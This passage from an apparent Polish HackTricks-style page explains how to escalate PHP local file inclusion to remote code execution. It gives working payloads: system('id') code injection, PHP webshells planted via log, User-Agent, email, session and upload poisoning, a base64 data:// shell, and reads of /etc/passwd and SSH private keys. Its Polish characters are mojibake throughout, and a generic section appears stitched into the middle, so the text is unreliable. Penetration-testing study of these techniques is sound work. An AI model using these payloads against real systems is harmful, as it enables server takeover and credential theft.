Podczas gdy to ma na celu zatrzymanie przechodzenia, nieumyÅ›lnie tworzy wektor dla wstrzykiwania kodu. Aby wykorzystaÄ‡ to do odczytu zawartoÅ›ci pliku, atakujÄ…cy mÃ³gÅ‚by uÅ¼yÄ‡:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonania dowolnych poleceÅ„ systemowych moÅ¼na uÅ¼yÄ‡:
```plaintext
' and die(system("id")) or '
```
WaÅ¼ne jest **URL-kodowanie tych payloadÃ³w**.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w hakerstwo**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci o hakerstwie na Å¼ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dowi

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## PHP Blind Path Traversal

{% hint style="warning" %}
Ta technika jest istotna w przypadkach, gdy **kontrolujesz** **Å›cieÅ¼kÄ™ pliku** funkcji **PHP**, ktÃ³ra bÄ™dzie **odczytywaÄ‡ plik**, ale nie zobaczysz zawartoÅ›ci pliku (jak w prostym wywoÅ‚aniu **`file()`**), ale zawartoÅ›Ä‡ nie jest wyÅ›wietlana.
{% endhint %}

W [**tym niesamowitym poÅ›cie**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaÅ›niono, jak Å›lepa nawigacja Å›cieÅ¼kÄ… moÅ¼e byÄ‡ wykorzystana za pomocÄ… filtru PHP do **wycieku zawartoÅ›ci pliku za pomocÄ… orakulum bÅ‚Ä™dÃ³w**.

PodsumowujÄ…c, technika ta polega na uÅ¼yciu kodowania **"UCS-4LE"**, aby zawartoÅ›Ä‡ pliku byÅ‚a tak **duÅ¼a**, Å¼e funkcja PHP otwierajÄ…ca plik spowoduje **bÅ‚Ä…d**.

NastÄ™pnie, aby ujawniÄ‡ pierwszy znak, uÅ¼ywany jest filtr **`dechunk`** wraz z innymi, takimi jak **base64** lub **rot13**, a na koÅ„cu uÅ¼ywane sÄ… filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE**, aby **umieÅ›ciÄ‡ inne znaki na poczÄ…tku i ujawniÄ‡ je**.

**Funkcje, ktÃ³re mogÄ… byÄ‡ podatne**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (tylko docelowe tylko do odczytu z tym)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Aby uzyskaÄ‡ szczegÃ³Å‚y techniczne, sprawdÅº wspomniany post!

## LFI2RCE

### Remote File Inclusion

WyjaÅ›nione wczeÅ›niej, [**kliknij tutaj**](./#remote-file-inclusion).

### Za pomocÄ… pliku dziennika Apache/Nginx

JeÅ›li serwer Apache lub Nginx jest **podatny na LFI** wewnÄ…trz funkcji include, moÅ¼esz sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, ustaw wewnÄ…trz **user agent** lub wewnÄ…trz parametru **GET** powÅ‚okÄ™ PHP, na przykÅ‚ad **`<?php system($_GET['c']); ?>`**, a nastÄ™pnie doÅ‚Ä…cz ten plik

{% hint style="warning" %}
ZwrÃ³Ä‡ uwagÄ™, Å¼e **jeÅ›li uÅ¼ywasz podwÃ³jnych cudzysÅ‚owÃ³w** dla powÅ‚oki zamiast **pojedynczych cudzysÅ‚owÃ³w**, podwÃ³jne cudzysÅ‚owy zostanÄ… zmodyfikowane na ciÄ…g "_**quote;**_", **PHP wyrzuci bÅ‚Ä…d** i **nic wiÄ™cej nie zostanie wykonane**.

Upewnij siÄ™ rÃ³wnieÅ¼, Å¼e **poprawnie zapisujesz payload**, w przeciwnym razie PHP bÄ™dzie generowaÄ‡ bÅ‚Ä…d za kaÅ¼dym razem, gdy sprÃ³buje zaÅ‚adowaÄ‡ plik dziennika, i nie bÄ™dziesz mieÄ‡ drugiej szansy.
{% endhint %}

MoÅ¼na to rÃ³wnieÅ¼ zrobiÄ‡ w innych dziennikach, ale **bÄ…dÅº ostroÅ¼ny**, kod wewnÄ…trz dziennikÃ³w moÅ¼e byÄ‡ kodowany URL i moÅ¼e to zniszczyÄ‡ powÅ‚okÄ™. NagÅ‚Ã³wek **authorisation "basic"** zawiera "user:password" w Base64 i jest dekodowany wewnÄ…trz dziennikÃ³w. PowÅ‚okÄ™ PHP moÅ¼na wstawiÄ‡ wewnÄ…trz tego nagÅ‚Ã³wka.\
Inne moÅ¼liwe Å›cieÅ¼ki dziennika:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Przez Email

**WyÅ›lij wiadomoÅ›Ä‡** na wewnÄ™trzne konto (user@localhost) zawierajÄ…cÄ… swÃ³j kod PHP, na przykÅ‚ad `<?php echo system($_REQUEST["cmd"]); ?>`, a nastÄ™pnie sprÃ³buj doÅ‚Ä…czyÄ‡ do wiadomoÅ›ci uÅ¼ytkownika za pomocÄ… Å›cieÅ¼ki **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Przez /proc/\*/fd/\*

1. PrzeÅ›lij wiele powÅ‚ok (na przykÅ‚ad: 100)
2. DoÅ‚Ä…cz [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID to identyfikator procesu (moÅ¼e byÄ‡ wybrute-forced) i $FD to deskryptor pliku (rÃ³wnieÅ¼ moÅ¼e byÄ‡ wybrute-forced)

### Przez /proc/self/environ

Podobnie jak w przypadku pliku dziennika, wyÅ›lij payload w nagÅ‚Ã³wku User-Agent, zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Przez przesÅ‚anie pliku

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik, po prostu wstrzyknij do niego Å‚adunek powÅ‚oki (np. `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby zachowaÄ‡ czytelnoÅ›Ä‡ pliku, najlepiej jest wstrzyknÄ…Ä‡ do metadanych obrazÃ³w/doc/pdf.

### Za pomocÄ… przesyÅ‚ania pliku ZIP

PrzeÅ›lij plik ZIP zawierajÄ…cy skompresowany PHP shell i uzyskaj dostÄ™p:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Za pomocÄ… sesji PHP

SprawdÅº, czy strona internetowa uÅ¼ywa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje sÄ… przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw ciasteczko na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# WÅ‚Ä…czanie pliku sesji PHP za pomocÄ… LFI

## Opis

WÅ‚Ä…czanie pliku sesji PHP za pomocÄ… Local File Inclusion (LFI) jest technikÄ… wykorzystywanÄ… w celu uzyskania dostÄ™pu do zawartoÅ›ci sesji uÅ¼ytkownika. LFI pozwala na wczytanie plikÃ³w z lokalnego systemu plikÃ³w, co moÅ¼e prowadziÄ‡ do odczytu poufnych informacji, takich jak dane uwierzytelniajÄ…ce, tokeny sesji i inne dane sesji.

## Wykorzystanie

Aby wykorzystaÄ‡ LFI do wÅ‚Ä…czenia pliku sesji PHP, naleÅ¼y znaleÅºÄ‡ podatny punkt koÅ„cowy, ktÃ³ry umoÅ¼liwia wczytanie plikÃ³w z lokalnego systemu plikÃ³w. MoÅ¼e to byÄ‡ spowodowane nieodpowiedniÄ… walidacjÄ… danych wejÅ›ciowych lub nieprawidÅ‚owym wykorzystaniem funkcji do wczytywania plikÃ³w.

NastÄ™pnie, naleÅ¼y skonstruowaÄ‡ odpowiedniÄ… Å›cieÅ¼kÄ™ do pliku sesji PHP. MoÅ¼e to byÄ‡ Å›cieÅ¼ka bezwzglÄ™dna lub wzglÄ™dna, w zaleÅ¼noÅ›ci od implementacji aplikacji. PrzykÅ‚adowe Å›cieÅ¼ki mogÄ… wyglÄ…daÄ‡ nastÄ™pujÄ…co:

- ÅšcieÅ¼ka bezwzglÄ™dna: `/var/lib/php/sessions/sess_1234567890abcdef`
- ÅšcieÅ¼ka wzglÄ™dna: `../../../../../var/lib/php/sessions/sess_1234567890abcdef`

Po skonstruowaniu odpowiedniej Å›cieÅ¼ki, moÅ¼na jÄ… przekazaÄ‡ do podatnego punktu koÅ„cowego, aby wczytaÄ‡ zawartoÅ›Ä‡ pliku sesji PHP. W ten sposÃ³b moÅ¼na uzyskaÄ‡ dostÄ™p do poufnych informacji przechowywanych w sesji uÅ¼ytkownika.

## Zabezpieczenia

Aby zabezpieczyÄ‡ siÄ™ przed atakami LFI, naleÅ¼y:

- Poprawnie walidowaÄ‡ i filtrowaÄ‡ wszelkie dane wejÅ›ciowe, ktÃ³re sÄ… wykorzystywane do konstrukcji Å›cieÅ¼ki pliku.
- UnikaÄ‡ wykorzystywania funkcji do wczytywania plikÃ³w, ktÃ³re mogÄ… byÄ‡ podatne na ataki LFI.
- PrzechowywaÄ‡ pliki sesji w bezpiecznym miejscu, niedostÄ™pnym dla uÅ¼ytkownikÃ³w zewnÄ™trznych.

## PrzykÅ‚ady

### PrzykÅ‚ad 1: WÅ‚Ä…czanie pliku sesji PHP za pomocÄ… LFI

```
GET /vulnerable.php?page=/var/lib/php/sessions/sess_1234567890abcdef HTTP/1.1
Host: example.com
```

W tym przykÅ‚adzie, atakujÄ…cy wykorzystuje podatny punkt koÅ„cowy `vulnerable.php`, ktÃ³ry umoÅ¼liwia wczytanie plikÃ³w z lokalnego systemu plikÃ³w. AtakujÄ…cy konstruuje Å›cieÅ¼kÄ™ do pliku sesji PHP i przekazuje jÄ… jako parametr `page`. W rezultacie, atakujÄ…cy moÅ¼e uzyskaÄ‡ dostÄ™p do zawartoÅ›ci pliku sesji PHP, w tym poufnych informacji uÅ¼ytkownika.

### PrzykÅ‚ad 2: WÅ‚Ä…czanie pliku sesji PHP za pomocÄ… LFI (Å›cieÅ¼ka wzglÄ™dna)

```
GET /vulnerable.php?page=../../../../../var/lib/php/sessions/sess_1234567890abcdef HTTP/1.1
Host: example.com
```

W tym przykÅ‚adzie, atakujÄ…cy wykorzystuje podatny punkt koÅ„cowy `vulnerable.php`, ktÃ³ry umoÅ¼liwia wczytanie plikÃ³w z lokalnego systemu plikÃ³w. AtakujÄ…cy konstruuje Å›cieÅ¼kÄ™ wzglÄ™dnÄ… do pliku sesji PHP i przekazuje jÄ… jako parametr `page`. W rezultacie, atakujÄ…cy moÅ¼e uzyskaÄ‡ dostÄ™p do zawartoÅ›ci pliku sesji PHP, w tym poufnych informacji uÅ¼ytkownika.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Przez ssh

JeÅ›li ssh jest aktywne, sprawdÅº, ktÃ³ry uÅ¼ytkownik jest uÅ¼ywany (/proc/self/status & /etc/passwd) i sprÃ³buj uzyskaÄ‡ dostÄ™p do **\<HOME>/.ssh/id\_rsa**

### **Przez** **dzienniki** **vsftpd**

Dzienniki serwera FTP vsftpd znajdujÄ… siÄ™ w **_/var/log/vsftpd.log_**. W przypadku istnienia podatnoÅ›ci na lokalne wÅ‚Ä…czenie pliku (LFI) i moÅ¼liwoÅ›ci dostÄ™pu do wystawionego serwera vsftpd, moÅ¼na rozwaÅ¼yÄ‡ nastÄ™pujÄ…ce kroki:

1. Wstrzyknij Å‚adunek PHP do pola nazwy uÅ¼ytkownika podczas procesu logowania.
2. Po wstrzykniÄ™ciu, uÅ¼yj LFI, aby pobraÄ‡ dzienniki serwera z **_/var/log/vsftpd.log_**.


### Przez filtr php base64 (uÅ¼ywajÄ…c base64)

Jak pokazano w [tym](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artykule, filtr PHP base64 po prostu ignoruje Nie-base64. MoÅ¼esz uÅ¼yÄ‡ tego do ominiÄ™cia sprawdzania rozszerzenia pliku: jeÅ›li dostarczysz base64, ktÃ³ry koÅ„czy siÄ™ na ".php", to po prostu zignoruje "." i doÅ‚Ä…czy "php" do base64. Oto przykÅ‚adowy Å‚adunek:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Za pomocÄ… filtrÃ³w php (nie wymagany plik)

Ten [**opis**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) wyjaÅ›nia, Å¼e moÅ¼na uÅ¼yÄ‡ **filtrÃ³w php do generowania dowolnej zawartoÅ›ci** jako wyniku. Oznacza to, Å¼e moÅ¼na **generowaÄ‡ dowolny kod php** do doÅ‚Ä…czenia **bez koniecznoÅ›ci zapisywania** go do pliku.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Za pomocÄ… bÅ‚Ä™du segmentacji

**PrzeÅ›lij** plik, ktÃ³ry zostanie przechowywany jako **tymczasowy** w `/tmp`, a nastÄ™pnie w **tym samym Å¼Ä…daniu** wywoÅ‚aj **bÅ‚Ä…d segmentacji**, wtedy **tymczasowy plik nie zostanie usuniÄ™ty** i moÅ¼na go wyszukaÄ‡.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Za pomocÄ… tymczasowego przechowywania plikÃ³w Nginx

JeÅ›li znaleziono **Lokalne WÅ‚Ä…czenie Pliku** i **Nginx** dziaÅ‚a przed PHP, moÅ¼na uzyskaÄ‡ RCE za pomocÄ… nastÄ™pujÄ…cej techniki:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Za pomocÄ… PHP\_SESSION\_UPLOAD\_PROGRESS

JeÅ›li znaleziono **Lokalne WÅ‚Ä…czenie Pliku**, nawet jeÅ›li **nie ma siÄ™ sesji** i `session.auto_start` jest ustawione na `Off`. JeÅ›li podasz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP **wÅ‚Ä…czy sesjÄ™ dla Ciebie**. MoÅ¼na to wykorzystaÄ‡ do uzyskania RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Za pomocÄ… tymczasowego przesyÅ‚ania plikÃ³w w systemie Windows

JeÅ›li znaleziono **Lokalne WÅ‚Ä…czenie Pliku** i serwer dziaÅ‚a w systemie **Windows**, moÅ¼na uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Za pomocÄ… phpinfo() (file\_uploads = on)

JeÅ›li znaleziono **Lokalne WÅ‚Ä…czenie Pliku** i plik ujawniajÄ…cy **phpinfo()** z file\_uploads = on, moÅ¼na uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Za pomocÄ… compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ujawnienie Å›cieÅ¼ki

JeÅ›li znaleziono **Lokalne WÅ‚Ä…czenie Pliku** i moÅ¼na **wydobyÄ‡ Å›cieÅ¼kÄ™** do pliku tymczasowego, ALE **serwer sprawdza**, czy **doÅ‚Ä…czany plik ma znaczniki PHP**, moÅ¼na sprÃ³bowaÄ‡ **obejÅ›Ä‡ tÄ™ kontrolÄ™** za pomocÄ… tej **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Za pomocÄ… wiecznego oczekiwania + brute force

JeÅ›li moÅ¼na wykorzystaÄ‡ LFI do **przesyÅ‚ania tymczasowych plikÃ³w** i spowodowaÄ‡ **zawieszenie** wykonania PHP na serwerze, moÅ¼na nastÄ™pnie **przez godziny prÃ³bowaÄ‡ odgadnÄ…Ä‡ nazwy plikÃ³w tymczasowych**, aby je znaleÅºÄ‡:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do bÅ‚Ä™du krytycznego

JeÅ›li doÅ‚Ä…czysz ktÃ³rykolwiek z plikÃ³w `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz doÅ‚Ä…czyÄ‡ ten sam plik 2 razy, aby spowodowaÄ‡ ten bÅ‚Ä…d).

**Nie wiem, jak to moÅ¼e byÄ‡ przydatne, ale moÅ¼e tak byÄ‡.**\
_Nawet jeÅ›li spowodujesz bÅ‚Ä…d krytyczny PHP, tymczasowe pliki przesÅ‚ane sÄ… usuwane._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## OdwoÅ‚ania

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hakerstwem

**AktualnoÅ›ci na Å¼ywo o Hackingu**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
